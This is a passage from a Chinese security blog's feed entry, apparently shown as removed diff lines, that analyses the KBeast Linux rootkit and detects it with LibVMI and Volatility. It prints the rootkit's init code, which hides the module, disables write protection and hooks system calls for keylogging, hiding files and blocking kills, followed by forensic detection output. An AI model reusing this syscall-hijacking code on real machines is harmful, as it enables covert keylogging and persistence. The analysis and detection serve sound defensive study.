class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*init module insmod*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;//Uncomment to hide this module&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  list_del_init(&amp;amp;__this_module.&lt;span class=&quot;built_in&quot;&gt;list&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; tcp_seq_afinfo *my_afinfo = &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;//proc_net is disappeared in 2.6.32, use init_net.proc_net&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; proc_dir_entry *my_dir_entry = init_net.proc_net-&amp;gt;subdir;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  write_cr0 (read_cr0 () &amp;amp; (~ &lt;span class=&quot;number&quot;&gt;0x10000&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(_KEYLOG_)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    o_read=(void *)sys_call_table[__NR_read];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sys_call_table[__NR_read]=h4x_read;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_write=(void *)sys_call_table[__NR_write];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table[__NR_write]=h4x_write;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;if&lt;/span&gt; defined(__x86_64__)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    o_getdents=sys_call_table [__NR_getdents];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sys_call_table [__NR_getdents]=h4x_getdents;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;elif&lt;/span&gt; defined(__i386__)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    o_getdents64=sys_call_table [__NR_getdents64];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sys_call_table [__NR_getdents64]=h4x_getdents64;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;error&lt;/span&gt; Unsupported architecture&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_unlink = sys_call_table [__NR_unlink];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_unlink] = h4x_unlink;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_rmdir = sys_call_table [__NR_rmdir];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_rmdir] = h4x_rmdir;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_unlinkat = sys_call_table [__NR_unlinkat];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_unlinkat] = h4x_unlinkat;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_rename = sys_call_table [__NR_rename];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_rename] = h4x_rename;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_open = sys_call_table [__NR_open];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_open] = h4x_open;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_kill = sys_call_table [__NR_kill];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_kill] = h4x_kill;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_delete_module = sys_call_table [__NR_delete_module];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_delete_module] = h4x_delete_module;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  write_cr0 (read_cr0 () | &lt;span class=&quot;number&quot;&gt;0x10000&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;strcmp&lt;/span&gt;(my_dir_entry-&amp;gt;name, &lt;span class=&quot;string&quot;&gt;&quot;tcp&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    my_dir_entry = my_dir_entry-&amp;gt;next;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry-&amp;gt;data))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//seq_show is disappeared in 2.6.32, use seq_ops.show&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    old_tcp4_seq_show = my_afinfo-&amp;gt;seq_ops.show;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    my_afinfo-&amp;gt;seq_ops.show = h4x_tcp4_seq_show;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;首先将模块隐藏，取消CR0写保护，找到系统调用表地址，将其处理函数换成自己的函数，分别对应其中的特性。 如：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sys_call_table[__NR_read]=h4x_read; // log key
-sys_call_table[__NR_write]=h4x_write; // fake output ps,pstree,top,lsof
-sys_call_table [__NR_getdents]=h4x_getdents; //hide file and directory
-sys_call_table [__NR_unlink] = h4x_unlink; //Don&amp;apos;t allow your file to be removed
-sys_call_table [__NR_rmdir] = h4x_rmdir; //Don&amp;apos;t allow your directory to be removed
-sys_call_table [__NR_unlinkat] = h4x_unlinkat; //Don&amp;apos;t allow your file and directory to be removed 
-sys_call_table [__NR_rename] = h4x_rename; //Don&amp;apos;t allow your file to be renamed/moved
-sys_call_table [__NR_open] = h4x_open; //Don&amp;apos;t allow your file to be overwrited
-sys_call_table [__NR_kill] = h4x_kill; //Don&amp;apos;t allow your process to be killed
-sys_call_table [__NR_delete_module] = h4x_delete_module;
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;0X05-Kbeast-Detection-Using-Libvmi-and-Volatility&quot;&gt;&lt;a href=&quot;#0X05-Kbeast-Detection-Using-Libvmi-and-Volatility&quot; class=&quot;headerlink&quot; title=&quot;0X05 Kbeast Detection Using Libvmi and Volatility&quot;&gt;&lt;/a&gt;0X05 Kbeast Detection Using Libvmi and Volatility&lt;/h3&gt;&lt;p&gt;检测之前，先按照 &lt;a href=&quot;http://www.chongh.wiki/blog/2016/03/30/virt-setup-analysis/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;上一篇&lt;/a&gt; 文章搭好环境。&lt;/p&gt;
-&lt;p&gt;以下是分别利用volatility的linux_psaux、linux_pslist、linux_pstree、linux_lsof、linux_proc_maps、linux_check_modules插件检测出来的结果，能检测出其隐藏的进程、模块、进程间的关系以及所在路径。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_psaux | grep _h4x_bd
-
-Pid    Uid    Gid    Arguments 
-2316   2      2      ./_h4x_bd
-
- python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_pslist | grep _h4x_bd 
-
- Offset     Name                 Pid             Uid             Gid    DTB      Start Time
- 0xf579e680 _h4x_bd              2316            2               2      0x357c5000 2016-04-01 21:41:29 UTC+0000
-
-
-  python vol.py -l vmi://1004desktop32         --profile=Linuxubuntu1004desktopx86 linux_pstree | grep _h4x_bd 
-
- Name                 Pid             Uid 
- ._h4x_bd             2316            2 
-
- python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_pslsof | grep _h4x_bd 
-
-  Offset             Name                           Pid      FD       Path
-  0x00000000f579e680 _h4x_bd                            2316        1 /dev/pts/0
-0x00000000f579e680 _h4x_bd                            2316        2 /dev/pts/0
-0x00000000f579e680 _h4x_bd                            2316        3 socket:[11708]
-
-python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_proc_maps | grep _h4x_bd 
-
-
- linux_proc_maps
-
-
- Offset             Pid      Name                 Start              End         
-       Flags       Pgoff Major  Minor  Inode      File Path
-
-
-
-
- 0x00000000f579e680     2316 _h4x_bd                  0x0000000000adb000 0x0000000000adc000 ---      0x153000    251      1     134375 /lib/tls/i686/cmov/libc-2.11.1.so
-0x00000000f579e680     2316 _h4x_bd              0x0000000000adc000 0x0000000000ade000 r--      0x153000    251      1     134375 /lib/tls/i686/cmov/libc-2.11.1.so
-0x00000000f579e680     2316 _h4x_bd              0x0000000000ade000 0x0000000000adf000 rw-      0x155000    251      1     134375 /lib/tls/i686/cmov/libc-2.11.1.so
-0x00000000f579e680     2316 _h4x_bd              0x0000000000adf000 0x0000000000ae2000 rw-           0x0      0      0          0 
-0x00000000f579e680     2316 _h4x_bd              0x0000000008048000 0x0000000008049000 r-x           0x0    251      1     136169 /usr/_h4x_/_h4x_bd
-0x00000000f579e680     2316 _h4x_bd              0x0000000008049000 0x000000000804a000 r--        0x1000    251      1     136169 /usr/_h4x_/_h4x_bd
-0x00000000f579e680     2316 _h4x_bd              0x000000000804a000 0x000000000804b000 rw-        0x2000    251      1     136169 /usr/_h4x_/_h4x_bd
-0x00000000f579e680     2316 _h4x_bd              0x00000000b7875000 0x00000000b7876000 rw-           0x0      0      0          0 
-0x00000000f579e680     2316 _h4x_bd              0x00000000b7884000 0x00000000b7886000 rw-           0x0      0      0          0 
-0x00000000f579e680     2316 _h4x_bd              0x00000000bfd84000 0x00000000bfd99000 rw-           0x0      0      0          0 [stack]
-
-  python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_check_moudles | grep _h4x_bd   
-
- Module Address Module Name             
- 0xf805dae0 ipsecs_kbeast_v1
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt; 当要清除module时，执行./setup clean. 但仍然会残留一些文件，无法删除。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Checking for make : /usr/bin/make
-Removing Kernel Module
-Removing Compiled Kernel Module
-Stoping Network Daemon
-Removing Backdoor File
-rm: cannot remove `./_h4x_bd&amp;apos;: Permission denied
-Removing Installation Directory
-rm: cannot remove `/usr/_h4x_/.ipsecs-kbeast-v1.o.cmd&amp;apos;:     Permission denied
-rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.o&amp;apos;:         Permission denied
-rm: cannot remove `/usr/_h4x_/.ipsecs-kbeast-v1.ko.cmd&amp;apos;:     Permission denied
-rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.ko&amp;apos;:         Permission denied
-rm: cannot remove                     `/usr/_h4x_/.tmp_versions/ipsecs-kbeast-v1.mod&amp;apos;: Permission     denied
-rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.mod.c&amp;apos;:         Permission denied
-rm: cannot remove         `/usr/_h4x_/.ipsecs-kbeast-v1.mod.o.cmd&amp;apos;: Permission denied
-rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.c&amp;apos;:         Permission denied
-rm: cannot remove `/usr/_h4x_/bd-ipsecs-kbeast-v1.c&amp;apos;:     Permission denied
-rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.mod.o&amp;apos;:     Permission denied
-rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.cc1&amp;apos;:     Permission denied 
-&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
-&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
-&lt;p&gt;仅为学习使用，未经博主同意，请勿转载。&lt;br&gt;本文地址： &lt;a href=&quot;http://www.chongh.wiki/blog/2016/04/02/kbeast-analysis-detection/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/04/02/kbeast-analysis-detection/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;作者[新浪微博：&lt;a href=&quot;http://weibo.com/u/2767520802?is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;]&lt;/p&gt;
-&lt;hr&gt;
-&lt;h3 id=&quot;Reference&quot;&gt;&lt;a href=&quot;#Reference&quot; class=&quot;headerlink&quot; title=&quot;Reference&quot;&gt;&lt;/a&gt;Reference&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://volatility-labs.blogspot.com/2012/09/movp-15-kbeast-rootkit-detecting-hidden.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://volatility-labs.blogspot.com/2012/09/movp-15-kbeast-rootkit-detecting-hidden.html&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;http://cradpdf.drdc-rddc.gc.ca/PDFS/unc199/p801869_A1b.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://cradpdf.drdc-rddc.gc.ca/PDFS/unc199/p801869_A1b.pdf&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/&lt;/a&gt; &lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;http://dddotcom.github.io/2015/01/10/Kbeast-Source-Code-Analysis/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://dddotcom.github.io/2015/01/10/Kbeast-Source-Code-Analysis/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;http://beneathclevel.blogspot.com/2013/06/a-linux-rootkit-tutorial-introduction.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://beneathclevel.blogspot.com/2013/06/a-linux-rootkit-tutorial-introduction.html&lt;/a&gt;&lt;/p&gt;
-</content>
-    
-    <summary type="html">
-    
-      &lt;blockquote&gt;
-&lt;ul&gt;
-&lt;li&gt;0X00 全文环境&lt;/li&gt;
-&lt;li&gt;0X01 Kbeast 特性&lt;/li&gt;
-&lt;li&gt;0X02 系统调用劫持基础&lt;/li&gt;
-&lt;li&gt;0X03 Kbeast 使用&lt;/li&gt;
-&lt;li&gt;0X04 Kbeast 核心&lt;/li&gt;
-&lt;li&gt;0X05 Kbeast Detection &lt;/li&gt;
-&lt;/ul&gt;
-&lt;/blockquote&gt;
-    
-    </summary>
-    
-      <category term="security" scheme="http://yoursite.com/categories/security/"/>
-    
-    
-      <category term="Security" scheme="http://yoursite.com/tags/Security/"/>
-    
-      <category term="Attack" scheme="http://yoursite.com/tags/Attack/"/>
-    
-      <category term="Malware" scheme="http://yoursite.com/tags/Malware/"/>
-    
-      <category term="Rootkit" scheme="http://yoursite.com/tags/Rootkit/"/>
     
   </entry>
   
